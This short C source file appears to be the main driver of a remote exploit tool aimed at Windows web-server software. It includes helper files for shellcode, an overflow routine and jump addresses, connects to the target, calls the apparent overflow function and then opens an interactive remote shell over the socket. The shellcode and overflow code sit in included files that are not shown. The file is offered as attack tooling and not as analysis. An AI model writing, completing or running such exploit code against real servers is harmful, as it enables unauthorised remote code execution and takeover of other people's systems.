#include <windows.h> 
#include <winsock.h>
#include <stdio.h>
#include <httpext.h>
#include "..\include\main.h"
#include "..\include\jmpadd.h"


#pragma  comment(lib,"ws2_32")


#include "..\include\inout.c"
#include "..\include\getvar.c"
#include "..\include\cmd.c"
#include "..\include\sendrecv.c"
#include "..\include\over.c"
#include "..\include\getshellcode.c"

#include "..\include\shellcode.c"

#include "getoverstr.c"
#include "overinfo.c"


int main(int argc, char **argv)
{ 
  
  int     fd;
  getvar(argc,argv);
  fd=server_socket;
  
  printinfo();

  over(fd);
  shellcmd(fd);

  closesocket(fd);
  WSACleanup( );
  return(0);
}
